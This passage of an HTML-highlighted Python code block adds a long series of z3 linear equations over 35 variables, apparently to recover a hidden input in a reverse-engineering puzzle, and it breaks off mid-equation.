Solver()</span><br><span class="line">s.add(<span class="number">281</span>*v0+<span class="number">1020</span>*v1+<span class="number">980</span>*v2+<span class="number">902</span>*v3+<span class="number">338</span>*v4+<span class="number">960</span>*v5+<span class="number">1001</span>*v6+<span class="number">1017</span>*v7+<span class="number">963</span>*v8+<span class="number">442</span>*v9+<span class="number">536</span>*v10+<span class="number">1022</span>*v11+<span class="number">212</span>*v12+<span class="number">186</span>*v13+<span class="number">657</span>*v14+<span class="number">886</span>*v15+<span class="number">243</span>*v16+<span class="number">802</span>*v17+<span class="number">751</span>*v18+<span class="number">742</span>*v19+<span class="number">712</span>*v20+<span class="number">316</span>*v21+<span class="number">256</span>*v22+<span class="number">928</span>*v23+<span class="number">1011</span>*v24+<span class="number">707</span>*v25+<span class="number">415</span>*v26+<span class="number">244</span>*v27+<span class="number">962</span>*v28+<span class="number">796</span>*v29+<span class="number">473</span>*v30+<span class="number">96</span>*v31+<span class="number">598</span>*v32+<span class="number">948</span>*v33+<span class="number">416</span>*v34==<span class="number">12220997</span>)</span><br><span class="line">s.add(<span class="number">442</span>*v0+<span class="number">272</span>*v1+<span class="number">973</span>*v2+<span class="number">311</span>*v3+<span class="number">886</span>*v4+<span class="number">465</span>*v5+<span class="number">91</span>*v6+<span class="number">579</span>*v7+<span class="number">88</span>*v8+<span class="number">1000</span>*v9+<span class="number">20</span>*v10+<span class="number">914</span>*v11+<span class="number">991</span>*v12+<span class="number">953</span>*v13+<span class="number">47</span>*v14+<span class="number">117</span>*v15+<span class="number">216</span>*v16+<span class="number">693</span>*v17+<span class="number">346</span>*v18+<span class="number">374</span>*v19+<span class="number">175</span>*v20+<span class="number">46</span>*v21+<span class="number">221</span>*v22+<span class="number">485</span>*v23+<span class="number">1022</span>*v24+<span class="number">28</span>*v25+<span class="number">380</span>*v26+<span class="number">997</span>*v27+<span class="number">411</span>*v28+<span class="number">421</span>*v29+<span class="number">361</span>*v30+<span class="number">81</span>*v31+<span class="number">145</span>*v32+<span class="number">941</span>*v33+<span class="number">325</span>*v34==<span class="number">9213917</span>)</span><br><span class="line">s.add(<span class="number">175</span>*v0+<span class="number">989</span>*v1+<span class="number">486</span>*v2+<span class="number">717</span>*v3+<span class="number">146</span>*v4+<span class="number">418</span>*v5+<span class="number">446</span>*v6+<span class="number">598</span>*v7+<span class="number">526</span>*v8+<span class="number">363</span>*v9+<span class="number">18</span>*v10+<span class="number">332</span>*v11+<span class="number">103</span>*v12+<span class="number">834</span>*v13+<span class="number">443</span>*v14+<span class="number">407</span>*v15+<span class="number">870</span>*v16+<span class="number">999</span>*v17+<span class="number">278</span>*v18+<span class="number">624</span>*v19+<span class="number">863</span>*v20+<span class="number">486</span>*v21+<span class="number">413</span>*v22+<span class="number">825</span>*v23+<span class="number">347</span>*v24+<span class="number">543</span>*v25+<span class="number">362</span>*v26+<span class="number">645</span>*v27+<span class="number">505</span>*v28+<span class="number">738</span>*v29+<span class="number">612</span>*v30+<span class="number">268</span>*v31+<span class="number">94</span>*v32+<span class="number">646</span>*v33+<span class="number">32</span>*v34==<span class="number">8907244</span>)</span><br><span class="line">s.add(<span class="number">987</span>*v0+<span class="number">454</span>*v1+<span class="number">828</span>*v2+<span class="number">508</span>*v3+<span class="number">993</span>*v4+<span class="number">762</span>*v5+<span class="number">497</span>*v6+<span class="number">83</span>*v7+<span class="number">591</span>*v8+<span class="number">533</span>*v9+<span class="number">955</span>*v10+<span class="number">265</span>*v11+<span class="number">568</span>*v12+<span class="number">117</span>*v13+<span class="number">818</span>*v14+<span class="number">133</span>*v15+<span class="number">1</span>*v16+<span class="number">305</span>*v17+<span class="number">319</span>*v18+<span class="number">257</span>*v19+<span class="number">273</span>*v20+<span class="number">956</span>*v21+<span class="number">260</span>*v22+<span class="number">349</span>*v23+<span class="number">719</span>*v24+<span class="number">416</span>*v25+<span class="number">956</span>*v26+<span class="number">388</span>*v27+<span class="number">795</span>*v28+<span class="number">43</span>*v29+<span class="number">378</span>*v30+<span class="number">379</span>*v31+<span class="number">295</span>*v32+<span class="number">603</span>*v33+<span class="number">722</span>*v34==<span class="number">10103617</span>)</span><br><span class="line">s.add(<span class="number">851</span>*v0+<span class="number">884</span>*v1+<span class="number">425</span>*v2+<span class="number">538</span>*v3+<span class="number">627</span>*v4+<span class="number">548</span>*v5+<span class="number">714</span>*v6+<span class="number">129</span>*v7+<span class="number">46</span>*v8+<span class="number">445</span>*v9+<span class="number">444</span>*v10+<span class="number">1002</span>*v11+<span class="number">170</span>*v12+<span class="number">162</span>*v13+<span class="number">476</span>*v14+<span class="number">849</span>*v15+<span class="number">136</span>*v16+<span class="number">929</span>*v17+<span class="number">392</span>*v18+<span class="number">341</span>*v19+<span class="number">747</span>*v20+<span class="number">385</span>*v21+<span class="number">318</span>*v22+<span class="number">503</span>*v23+<span class="number">248</span>*v24+<span class="number">308</span>*v25+<span class="number">838</span>*v26+<span class="number">567</span>*v27+<span class="number">565</span>*v28+<span class="number">878</span>*v29+<span class="number">831</span>*v30+<span class="number">561</span>*v31+<span class="number">222</span>*v32+<span class="number">363</span>*v33+<span class="number">74</span>*v34==<span class="number">9423443</span>)</span><br><span class="line">s.add(<span class="number">227</span>*v0+<span class="number">218</span>*v1+<span class="number">313</span>*v2+<span class="number">37</span>*v3+<span class="number">247</span>*v4+<span class="number">952</span>*v5+<span class="number">499</span>*v6+<span class="number">908</span>*v7+<span class="number">50</span>*v8+<span class="number">344</span>*v9+<span class="number">182</span>*v10+<span class="number">980</span>*v11+<span class="number">568</span>*v12+<span class="number">648</span>*v13+<span class="number">944</span>*v14+<span class="number">538</span>*v15+<span class="number">886</span>*v16+<span class="number">280</span>*v17+<span class="number">18</span>*v18+<span class="number">207</span>*v19+<span class="number">21</span>*v20+<span class="number">532</span>*v21+<span class="number">38</span>*v22+<span class="number">1007</span>*v23+<span class="number">890</span>*v24+<span class="number">335</span>*v25+<span class="number">748</span>*v26+<span class="number">88</span>*v27+<span class="number">478</span>*v28+<span class="number">539</span>*v29+<span class="number">966</span>*v30+<span class="number">961</span>*v31+<span class="number">632</span>*v32+<span class="number">350</span>*v33+<span class="number">289</span>*v34==<span class="number">9333864</span>)</span><br><span class="line">s.add(<span class="number">514</span>*v0+<span class="number">216</span>*v1+<span class="number">267</span>*v2+<span class="number">873</span>*v3+<span class="number">974</span>*v4+<span class="number">573</span>*v5+<span class="number">496</span>*v6+<span class="number">494</span>*v7+<span class="number">814</span>*v8+<span class="number">251</span>*v9+<span class="number">852</span>*v10+<span class="number">379</span>*v11+<span class="number">217</span>*v12+<span class="number">426</span>*v13+<span class="number">772</span>*v14+<span class="number">501</span>*v15+<span class="number">104</span>*v16+<span class="number">607</span>*v17+<span class="number">824</span>*v18+<span class="number">716</span>*v19+<span class="number">875</span>*v20+<span class="number">580</span>*v21+<span class="number">247</span>*v22+<span class="number">232</span>*v23+<span class="number">642</span>*v24+<span class="number">381</span>*v25+<span class="number">423</span>*v26+<span class="number">446</span>*v27+<span class="number">88</span>*v28+<span class="number">273</span>*v29+<span class="number">166</span>*v30+<span class="number">865</span>*v31+<span class="number">436</span>*v32+<span class="number">829</span>*v33+<span class="number">303</span>*v34==<span class="number">10203418</span>)</span><br><span class="line">s.add(<span class="number">123</span>*v0+<span class="number">914</span>*v1+<span class="number">660</span>*v2+<span class="number">603</span>*v3+<span class="number">528</span>*v4+<span class="number">536</span>*v5+<span class="number">543</span>*v6+<span class="number">518</span>*v7+<span class="number">489</span>*v8+<span class="number">1021</span>*v9+<span class="number">739</span>*v10+<span class="number">90</span>*v11+<span class="number">933</span>*v12+<span class="number">610</span>*v13+<span class="number">548</span>*v14+<span class="number">560</span>*v15+<span class="number">537</span>*v16+<span class="number">552</span>*v17+<span class="number">191</span>*v18+<span class="number">320</span>*v19+<span class="number">344</span>*v20+<span class="number">968</span>*v21+<span class="number">469</span>*v22+<span class="number">106</span>*v23+<span class="number">497</span>*v24+<span class="number">329</span>*v25+<span class="number">736</span>*v26+<span class="number">720</span>*v27+<span class="number">465</span>*v28+<span class="number">63</span>*v29+<span class="number">159</span>*v30+<span class="number">929</span>*v31+<span class="number">916</span>*v32+<span class="number">209</span>*v33+<span class="number">635</span>*v34==<span class="number">10386146</span>)</span><br><span class="line">s.add(<span class="number">325</span>*v0+<span class="number">226</span>*v1+<span class="number">700</span>*v2+<span class="number">983</span>*v3+<span class="number">881</span>*v4+<span class="number">274</span>*v5+<span class="number">169</span>*v6+<span class="number">180</span>*v7+<span class="number">912</span>*v8+<span class="number">931</span>*v9+<span class="number">276</span>*v10+<span class="number">934</span>*v11+<span class="number">1001</span>*v12+<span class="number">634</span>*v13+<span class="number">247</span>*v14+<span class="number">937</span>*v15+<span class="number">904</span>*v16+<span class="number">546</span>*v17+<span class="number">909</span>*v18+<span class="number">884</span>*v19+<span class="number">756</span>*v20+<span class="number">358</span>*v21+<span class="number">649</span>*v22+<span class="number">381</span>*v23+<span class="number">946</span>*v24+<span class="number">457</span>*v25+<span class="number">523</span>*v26+<span class="number">598</span>*v27+<span class="number">766</span>*v28+<span class="number">781</span>*v29+<span class="number">429</span>*v30+<span class="number">644</span>*v31+<span class="number">115</span>*v32+<span class="number">358</span>*v33+<span class="number">981</span>*v34==<span class="number">12003802</span>)</span><br><span class="line">s.add(<span class="number">45</span>*v0+<span class="number">384</span>*v1+<span class="number">538</span>*v2+<span class="number">328</span>*v3+<span class="number">477</span>*v4+<span class="number">451</span>*v5+<span class="number">822</span>*v6+<span class="number">30</span>*v7+<span class="number">652</span>*v8+<span class="number">145</span>*v9+<span class="number">223</span>*v10+<span class="number">144</span>*v11+<span class="number">405</span>*v12+<span class="number">288</span>*v13+<span class="number">993</span>*v14+<span class="number">983</span>*v15+<span class="number">817</span>*v16+<span class="number">702</span>*v17+<span class="number">270</span>*v18+<span class="number">460</span>*v19+<span class="number">336</span>*v20+<span class="number">984</span>*v21+<span class="number">68</span>*v22+<span class="number">274</span>*v23+<span class="number">976</span>*v24+<span class="number">306</span>*v25+<span class="number">234</span>*v26+<span class="number">913</span>*v27+<span class="number">809</span>*v28+<span class="number">923</span>*v29+<span class="number">606</span>*v30+<span class="number">246</span>*v31+<span class="number">1002</span>*v32+<span class="number">73</span>*v33+<span class="number">738</span>*v34==<span class="number">9293993</span>)</span><br><span class="line">s.add(<span class="number">760</span>*v0+<span class="number">920</span>*v1+<span class="number">296</span>*v2+<span class="number">721</span>*v3+<span class="number">886</span>*v4+<span class="number">733</span>*v5+<span class="number">461</span>*v6+<span class="number">850</span>*v7+<span class="number">777</span>*v8+<span class="number">156</span>*v9+<span class="number">919</span>*v10+<span class="number">480</span>*v11+<span class="number">946</span>*v12+<span class="number">597</span>*v13+<span class="number">585</span>*v14+<span class="number">969</span>*v15+<span class="number">516</span>*v16+<span class="number">682</span>*v17+<span class="number">255</span>*v18+<span class="number">576</span>*v19+<span class="number">256</span>*v20+<span class="number">558</span>*v21+<span class="number">419</span>*v22+<span class="number">978</span>*v23+<span class="number">739</span>*v24+<span class="number">537</span>*v25+<span class="number">236</span>*v26+<span class="number">140</span>*v27+<span class="number">951</span>*v28+<span class="number">893</span>*v29+<span class="number">235</span>*v30+<span class="number">861</span>*v31+<span class="number">40</span>*v32+<span class="number">544</span>*v33+<span class="number">987</span>*v34==<span class="number">12024112</span>)</span><br><span class="line">s.add(<span class="number">156</span>*v0+<span class="number">359</span>*v1+<span class="number">443</span>*v2+<span class="number">477</span>*v3+<span class="number">635</span>*v4+<span class="number">394</span>*v5+<span class="number">784</span>*v6+<span class="number">193</span>*v7+<span class="number">58</span>*v8+<span class="number">1022</span>*v9+<span class="number">792</span>*v10+<span class="number">535</span>*v11+<span class="number">146</span>*v12+<span class="number">186</span>*v13+<span class="number">405</span>*v14+<span class="number">8</span>*v15+<span class="number">646</span>*v16+<span class="number">259</span>*v17+<span class="number">791</span>*v18+<span class="number">835</span>*v19+<span class="number">755</span>*v20+<span class="number">985</span>*v21+<span class="number">156</span>*v22+<span class="number">908</span>*v23+<span class="number">756</span>*v24+<span class="number">285</span>*v25+<span class="number">755</span>*v26+<span class="number">243</span>*v27+<span class="number">790</span>*v28+<span class="number">100</span>*v29+<span class="number">22</span>*v30+<span class="number">822</span>*v31+<span class="number">244</span>*v32+<span class="number">518</span>*v33+<span class="number">451</span>*v34==<span class="number">9044332</span>)</span><br><span class="line">s.add(<span class="number">747</span>*v0+<span class="number">892</span>*v1+<span class="number">582</span>*v2+<span class="number">435</span>*v3+<span class="number">958</span>*v4+<span class="number">289</span>*v5+<span class="number">1020</span>*v6+<span class="number">288</span>*v7+<span class="number">257</span>*v8+<span class="number">218</span>*v9+<span class="number">314</span>*v10+<span class="number">97</span>*v11+<span class="number">1015</span>*v12+<span class="number">229</span>*v13+<span class="number">601</span>*v14+<span class="number">788</span>*v15+<span class="number">979</span>*v16+<span class="number">146</span>*v17+<span class="number">391</span>*v18+<span class="number">726</span>*v19+<span class="number">708</span>*v20+<span class="number">861</span>*v21+<span class="number">447</span>*v22+<span class="number">636</span>*v23+<span class="number">1020</span>*v24+<span class="number">470</span>*v25+<span class="number">219</span>*v26+<span class="number">494</span>*v27+<span class="number">607</span>*v28+<span class="number">601</span>*v29+<span class="number">263</span>*v30+<span class="number">801</span>*v31+<span class="number">294</span>*v32+<span class="number">361</span>*v33+<span class="number">735</span>*v34==<span class="number">10302431</span>)</span><br><span class="line">s.add(<span class="number">84</span>*v0+<span class="number">262</span>*v1+<span class="number">338</span>*v2+<span class="number">565</span>*v3+<span class="number">97</span>*v4+<span class="number">0</span>*v5+<span class="number">174</span>*v6+<span class="number">801</span>*v7+<span class="number">537</span>*v8+<span class="number">959</span>*v9+<span class="number">317</span>*v10+<span class="number">10</span>*v11+<span class="number">673</span>*v12+<span class="number">70</span>*v13+<span class="number">149</span>*v14+<span class="number">520</span>*v15+<span class="number">351</span>*v16+<span class="number">405</span>*v17+<span class="number">294</span>*v18+<span class="number">1008</span>*v19+<span class="number">597</span>*v20+<span class="number">979</span>*v21+<span class="number">587</span>*v22+<span class="number">539</span>*v23+<span class="number">100</span>*v24+<span class="number">120</span>*v25+<span class="number">329</span>*v26+<span class="number">861</span>*v27+<span class="number">293</span>*v28+<span class="number">887</span>*v29+<span class="number">191</span>*v30+<span class="number">275</span>*v31+<span class="number">380</span>*v32+<span class="number">631</span>*v33+<span class="number">748</span>*v34==<span class="number">7441063</span>)</span><br><span class="line">s.add(<span class="number">227</span>*v0+<span class="number">26</span>*v1+<span class="number">510</span>*v2+<span class="number">943</span>*v3+<span class="number">982</span>*v4+<span class="number">28</span>*v5+<span class="number">613</span>*v6+<span class="number">321</span>*v7+<span class="number">641</span>*v8+<span class="number">474</span>*v9+<span class="number">48</span>*v10+<span class="number">105</span>*v11+<span class="number">200</span>*v12+<span class="number">307</span>*v13+<span class="number">573</span>*v14+<span class="number">593</span>*v15+<span class="number">854</span>*v16+<span class="number">511</span>*v17+<span class="number">442</span>*v18+<span class="number">912</span>*v19+<span class="number">936</span>*v20+<span class="number">517</span>*v21+<span class="number">217</span>*v22+<span class="number">891</span>*v23+<span class="number">731</span>*v24+<span class="number">5</span>*v25+<span class="number">5</span>*v26+<span class="number">752</span>*v27+<span class="number">707</span>*v28+<span class="number">355</span>*v29+<span class="number">668</span>*v30+<span class="number">372</span>*v31+<span class="number">728</span>*v32+<span class="number">619</span>*v33+<span class="number">934</span>*v34==<span class="number">8480144</span>)</span><br><span class="line">s.add(<span class="number">409</span>*v0+<span class="number">161</span>*v1+<span class="number">233</span>*v2+<span class="number">346</span>*v3+<span class="number">79</span>*v4+<span class="number">17</span>*v5+<span class="number">370</span>*v6+<span class="number">996</span>*v7+<span class="number">898</span>*v8+<span class="number">647</span>*v9+<span class="number">290</span>*v10+<span class="number">312</span>*v11+<span class="number">816</span>*v12+<span class="number">780</span>*v13+<span class="number">263</span>*v14+<span class="number">276</span>*v15+<span class="number">114</span>*v16+<span class="number">386</span>*v17+<span class="number">384</span>*v18+<span class="number">287</span>*v19+<span class="number">160</span>*v20+<span class="number">947</span>*v21+<span class="number">68</span>*v22+<span class="number">363</span>*v23+<span class="number">529</span>*v24+<span class="number">841</span>*v25+<span class="number">543</span>*v26+<span class="number">424</span>*v27+<span class="number">935</span>*v28+<span class="number">713</span>*v29+<span class="number">323</span>*v30+<span class="number">632</span>*v31+<span class="number">560</span>*v32+<span class="number">160</span>*v33+<span class="number">507</span>*v34==<span class="number">9108423</span>)</span><br><span class="line">s.add(<span class="number">651</span>*v0+<span class="number">994</span>*v1+<span class="number">22</span>*v2+<span class="number">888</span>*v3+<span class="number">347</span>*v4+<span class="number">72</span>*v5+<span class="number">82</span>*v6+<span class="number">323</span>*v7+<span class="number">66</span>*v8+<span class="number">915</span>*v9+<span class="number">14</span>*v10+<span class="number">400</span>*v11+<span class="number">314</span>*v12+<span class="number">132</span>*v13+<span class="number">143</span>*v14+<span class="number">512</span>*v15+<span class="number">375</span>*v16+<span class="number">312</span>*v17+<span class="number">173</span>*v18+<span class="number">196</span>*v19+<span class="number">644</span>*v20+<span class="number">459</span>*v21+<span class="number">475</span>*v22+<span class="number">166</span>*v23+<span class="number">352</span>*v24+<span class="number">481</span>*v25+<span class="number">439</span>*v26+<span class="number">409</span>*v27+<span class="number">17</span>*v28+<span class="number">522</span>*v29+<span class="number">66</span>*v30+<span class="number">887</span>*v31+<span class="number">529</span>*v32+<span class="number">420</span>*v33+<span class="number">345</span>*v34==<span class="number">6750308</span>)</span><br><span class="line">s.add(<span class="number">605</span>*v0+<span class="number">434</span>*v1+<span class="number">86</span>*v2+<span class="number">845</span>*v3+<span class="number">595</span>*v4+<span class="number">995</span>*v5+<span class="number">974</span>*v6+<span class="number">229</span>*v7+<span class="number">847</span>*v8+<span class="number">83</span>*v9+<span class="number">821</span>*v10+<span class="number">278</span>*v11+<span class="number">18</span>*v12+<span class="number">936</span>*v13+<span class="number">413</span>*v14+<span class="number">219</span>*v15+<span class="number">708</span>*v16+<span class="number">618</span>*v17+<span class="number">852</span>*v18+<span class="number">602</span>*v19+<span class="number">290</span>*v20+<span class="number">352</span>*v21+<span class="number">412</span>*v22+<span class="number">586</span>*v23+<span class="number">515</span>*v24+<span class="number">504</span>*v25+<span class="number">39</span>*v26+<span class="number">577</span>*v27+<span class="number">598</span>*v28+<span class="number">116</span>*v29+<span class="number">460</span>*v30+<span class="number">543</span>*v31+<span class="number">343</span>*v32+<span class="number">3</span>*v33+<span class="number">629</span>*v34==<span class="number">9625384</span>)</span><br><span class="line">s.add(<span class="number">603</span>*v0+<span class="number">905</span>*v1+<span class="number">403</span>*v2+<span class="number">224</span>*v3+<span class="number">327</span>*v4+<span class="number">806</span>*v5+<span class="number">1018</span>*v6+<span class="number">266</span>*v7+<span class="number">310</span>*v8+<span class="number">647</span>*v9+<span class="number">79</span>*v10+<span class="number">98</span>*v11+<span class="number">147</span>*v12+<span class="number">763</span>*v13+<span class="number">2</span>*v14+<span class="number">117</span>*v15+<span class="number">252</span>*v16+<span class="number">738</span>*v17+<span class="number">211</span>*v18+<span class="number">858</span>*v19+<span class="number">962</span>*v20+<span class="number">45</span>*v21+<span class="number">483</span>*v22+<span class="number">603</span>*v23+<span class="number">911</span>*v24+<span class="number">729</span>*v25+<span class="number">431</span>*v26+<span class="number">135</span>*v27+<span class="number">575</span>*v28+<span class="number">404</span>*v29+<span class="number">882</span>*v30+<span class="number">1013</span>*v31+<span class="number">72</span>*v32+<span class="number">568</span>*v33+<span class="number">621</span>*v34==<span class="number">9317350</span>)</span><br><span class="line">s.add(<span class="number">449</span>*v0+<span class="number">540</span>*v1+<span class="number">314</span>*v2+<span class="number">887</span>*v3+<span class="number">163</span>*v4+<span class="number">562</span>*v5+<span class="number">213</span>*v6+<span class="number">760</span>*v7+<span class="number">80</span>*v8+<span class="number">285</span>*v9+<span class="number">530</span>*v10+<span class="number">208</span>*v11+<span class="number">863</span>*v12+<span class="number">302</span>*v13+<span class="number">38</span>*v14+<span class="number">1005</span>*v15+<span class="number">279</span>*v16+<span class="number">444</span>*v17+<span class="number">121</span>*v18+<span class="number">27</span>*v19+<span class="number">49</span>*v20+<span class="number">693</span>*v21+<span class="number">442</span>*v22+<span class="number">661</span>*v23+<span class="number">722</span>*v24+<span class="number">739</span>*v25+<span class="number">734</span>*v26+<span class="number">766</span>*v27+<span class="number">111</span>*v28+<span class="number">781</span>*v29+<span class="number">65</span>*v30+<span class="number">790</span>*v31+<span class="number">703</span>*v32+<span class="number">227</span>*v33+<span class="number">28</span>*v34==<span class="number">8606739</span>)</span><br><span class="line">s.add(<span class="number">459</span>*v0+<span class="number">686</span>*v1+<span class="number">290</span>*v2+<span class="number">86</span>*v3+<span class="number">454</span>*v4+<span class="number">743</span>*v5+<span class="number">49</span>*v6+<span class="number">324</span>*v7+<span class="number">648</span>*v8+<span class="number">268</span>*v9+<span class="number">613</span>*v10+<span class="number">63</span>*v11+<span class="number">873</span>*v12+<span class="number">34</span>*v13+<span class="number">406</span>*v14+<span class="number">24</span>*v15+<span class="number">308</span>*v16+<span class="number">257</span>*v17+<span class="number">994</span>*v18+<span class="number">539</span>*v19+<span class="number">982</span>*v20+<span class="number">114</span>*v21+<span class="number">145</span>*v22+<span class="number">799</span>*v23+<span class="number">343</span>*v24+<span class="number">885</span>*v25+<span class="number">236</span>*v26+<span class="number">754</span>*v27+<span class="number">232</span>*v28+<span class="number">560</span>*v29+<span class="number">128</span>*v30+<span class="number">262</span>*v31+<span class="number">423</span>*v32+<span class="number">240</span>*v33+<span class="number">872</span>*v34==<span class="number">8487191</span>)</span><br><span class="line">s.add(<span class="number">32</span>*v0+<span class="number">26</span>*v1+<span class="number">11</span>*v2+<span class="number">132</span>*v3+<span class="number">306</span>*v4+<span class="number">143</span>*v5+<span class="number">200</span>*v6+<span class="number">950</span>*v7+<span class="number">472</span>*v8+<span class="number">821</span>*v9+<span class="number">505</span>*v10+<span class="number">831</span>*v11+<span class="number">462</span>*v12+<span class="number">521</span>*v13+<span class="number">474</span>*v14+<span class="number">821</span>*v15+<span class="number">220</span>*v16+<span class="number">674</span>*v17+<span class="number">207</span>*v18+<span class="number">783</span>*v19+<span class="number">9</span>*v20+<span class="number">322</span>*v21+<span class="number">780</span>*v22+<span class="number">1010</span>*v23+<span class="number">147</span>*v24+<span class="number">667</span>*v25+<span class="number">997</span>*v26+<span class="number">323</span>*v27+<span class="number">200</span>*v28+<span class="number">332</span>*v29+<span class="number">762</span>*v30+<span class="number">37</span>*v31+<span class="number">642</span>*v32+<span class="number">461</span>*v33+<span class="number">328</span>*v34==<span class="number">9002065</span>)</span><br><span class="line">s.add(<span class="number">82</span>*v0+<span class="number">151</span>*v1+<span class="number">994</span>*v2+<span class="number">1007</span>*v3+<span class="number">19</span>*v4+<span class="number">761</span>*v5+<span class="number">408</span>*v6+<span class="number">672</span>*v7+<span class="number">387</span>*v8+<span class="number">875</span>*v9+<span class="number">933</span>*v10+<span class="number">420</span>*v11+<span class="number">571</span>*v12+<span class="number">673</span>*v13+<span class="number">691</span>*v14+<span class="number">663</span>*v15+<span class="number">483</span>*v16+<span class="number">721</span>*v17+<span class="number">298</span>*v18+<span class="number">45</span>*v19+<span class="number">336</span>*v20+<span class="number">348</span>*v21+<span class="number">734</span>*v22+<span class="number">642</span>*v23+<span class="number">0</span>*v24+<span class="number">989</span>*v25+<span class="number">649</span>*v26+<span class="number">997</span>*v27+<span class="number">634</span>*v28+<span class="number">644</span>*v29+<span class="number">412</span>*v30+<span class="number">517</span>*v31+<span class="number">703</span>*v32+<span class="number">307</span>*v33+<span class="number">570</span>*v34==<span class="number">10212884</span>)</span><br><span class="line">s.add(<span class="number">345</span>*v0+<span class="number">907</span>*v1+<span class="number">886</span>*v2+<span class="number">526</span>*v3+<span class="number">333</span>*v4+<span class="number">388</span>*v5+<span class="number">405</span>*v6+<span class="number">122</span>*v7+<span class="number">365</span>*v8+<span class="number">624</span>*v9+<span class="number">48</span>*v10+<span class="number">198</span>*v11+<span class="number">602</span>*v12+<span class="number">879</span>*v13+<span class="number">161</span>*v14+<span class="number">506</span>*v15+<span class="number">710</span>*v16+<span class="number">260</span>*v17+<span class="number">203</span>*v18+<span class="number">970</span>*v19+<span class="number">731</span>*v20+<span class="number">1014</span>*v21+<span class="number">237</span>*v22+<span class="number">954</span>*v23+<span class="number">457</span>*v24+<span class="number">693</span>*v25+<span class="number">34</span>*v26+<span class="number">1010</span>*v27+<span class="number">462</span>*v28+<span class="number">895</span>*v29+<span class="number">648</span>*v30+<span class="number">159</span>*v31+<span class="number">753</span>*v32+<span class="number">909</span>*v33+<span class="number">666</span>*v34==<span class="number">9777472</span>)</span><br><span class="line">s.add(<span class="number">548</span>*v0+<span class="number">483</span>*v1+<span class="number">386</span>*v2+<span class="number">629</span>*v3+<span class="number">24</span>*v4+<span class="number">340</span>*v5+<span class="number">702</span>*v6+<span class="number">423</span>*v7+<span class="number">721</span>*v8+<span class="number">172</span>*v9+<span class="number">494</span>*v10+<span class="number">422</span>*v11+<span class="number">834</span>*v12+<span class="number">881</span>*v13+<span class="number">602</span>*v14+<span class="number">7</span>*v15+<span class="number">304</span>*v16+<span class="number">70</span>*v17+<span class="number">368</span>*v18+<span class="number">202</span>*v19+<span class="number">714</span>*v20+<span class="number">230</span>*v21+<span class="number">53</span>*v22+<span class="number">910</span>*v23+<span class="number">745</span>*v24+<span class="number">745</span>*v25+<span class="number">1020</span>*v26+<span class="number">227</span>*v27+<span class="number">513</span>*v28+<span class="number">72</span>*v29+<span class="number">528</span>*v30+<span class="number">597</span>*v31+<span class="number">852</span>*v32+<span class="number">22</span>*v33+<span class="number">649</span>*v34==<span class="number">9178370</span>)</span><br><span class="line">s.add(<span class="number">685</span>*v0+<span class="number">438</span>*v1+<span class="number">750</span>*v2+<span class="number">512</span>*v3+<span class="number">1013</span>*v4+<span class="number">403</span>*v5+<span class="number">429</span>*v6+<span class="number">254</span>*v7+<span class="number">807</span>*v8+<span class="number">169</span>*v9+<span class="number">420</span>*v10+<span class="number">233</span>*v11+<span class="number">696</span>*v12+<span class="number">806</span>*v13+<span class="number">414</span>*v14+<span class="number">697</span>*v15+<span class="number">506</span>*v16+<span class="number">215</span>*v17+<span class="number">39</span>*v18+<span class="number">300</span>*v19+<span class="number">32</span>*v20+<span class="number">877</span>*v21+<span class="number">855</span>*v22+<span class="number">618</span>*v23+<span class="number">615</span>*v24+<span class="number">19</span>*v25+<span class="number">276</span>*v26+<span class="number">268</span>*v27+<span class="number">777</span>*v28+<span class="number">95</span>*v29+<span class="number">204</span>*v30+<span class="number">641</span>*v31+<span class="number">335</span>*v32+<span class="number">955</span>*v33+<span class="number">885</span>*v34==<span class="number">9671988</span>)</span><br><span class="line">s.add(<span class="number">657</span>*v0+<span class="number">450</span>*v1+<span class="number">852</span>*v2+<span class="number">306</span>*v3+<span class="number">854</span>*v4+<span class="number">986</span>*v5+<span class="number">612</span>*v6+<span class="number">679</span>*v7+<span class="number">414</span>*v8+<span class="number">424</span>*v9+<span class="number">63</span>*v10+<span class="number">772</span>*v11+<span class="number">630</span>*v12+<span class="number">378</span>*v13+<span class="number">308</span>*v14+<span class="number">228</span>*v15+<span class="number">177</span>*v16+<span class="number">879</span>*v17+<span class="number">998</span>*v18+<span class="number">1003</span>*v19+<span class="number">172</span>*v20+<span class="number">722</span>*v21+<span class="number">923</span>*v22+<span class="number">78</span>*v23+<span class="number">383</span>*v24+<span class="number">302</span>*v25+<span class="number">106</span>*v26+<span class="number">710</span>*v27+<span class="number">199</span>*v28+<span class="number">470</span>*v29+<span class="number">519</span>*v30+<span class="number">982</span>*v31+<span class="number">881</span>*v32+<span class="number">409</span>*v33+<span class="number">74</span>*v34==<span class="number">11123701</span>)</span><br><span class="line">s.add(<span class="number">756</span>*v0+<span class="number">184</span>*v1+<span class="number">168</span>*v2+<span class="number">356</span>*v3+<span class="number">1007</span>*v4+<span class="number">971</span>*v5+<span class="number">469</span>*v6+<span class="number">668</span>*v7+<span class="number">10</span>*v8+<span class="number">748</span>*v9+<span class="number">254</span>*v10+<span class="number">183</span>*v11+<span class="number">667</span>*v12+<span class="number">996</span>*v13+<span class="number">28</span>*v14+<span class="number">588</span>*v15+<span class="number">146</span>*v16+<span class="number">365</span>*v17+<span class="number">761</span>*v18+<span class="number">729</span>*v19+<span class="number">107</span>*v20+<span class="number">195</span>*v21+<span class="number">579</span>*v22+<span class="number">475</span>*v23+<span class="number">851</span>*v24+<span class="number">66</span>*v25+<span class="number">944</span>*v26+<span class="number">469</span>*v27+<span class="number">285</span>*v28+<span class="number">367</span>*v29+<span class="number">459</span>*v30+<span class="number">301</span>*v31+<span class="number">1019</span>*v32+<span class="number">411</span>*v33+<span class="number">240</span>*v34==<span class="number">10125797</span>)</span><br><span class="line">s.add(<span class="number">140</span>*v0+<span class="number">697</span>*v1+<span class="number">281</span>*v2+<span class="number">687</span>*v3+<span class="number">34</span>*v4+<span class="number">657</span>*v5+<span class="number">678</span>*v6+<span class="number">420</span>*v7+<span class="number">697</span>*v8+<span class="number">632</span>*v9+<span class="number">660</span>*v10+<span class="number">464</span>*v11+<span class="number">797</span>*v12+<span class="number">60</span>*v13+<span class="number">655</span>*v14+<span class="number">347</span>*v15+<span class="number">496</span>*v16+<span class="number">796</span>*v17+<span class="number">532</span>*v18+<span class="number">55</span>*v19+<span class="number">450</span>*v20+<span class="number">961</span>*v21+<span class="number">44</span>*v22+<span class="number">769</span>*v23+<span class="number">622</span>*v24+<span class="number">527</span>*v25+<span class="number">756</span>*v26+<span class="number">843</span>*v27+<span class="number">878</span>*v28+<span class="number">844</span>*v29+<span class="number">767</span>*v30+<span class="number">478</span>*v31+<span class="number">612</span>*v32+<span 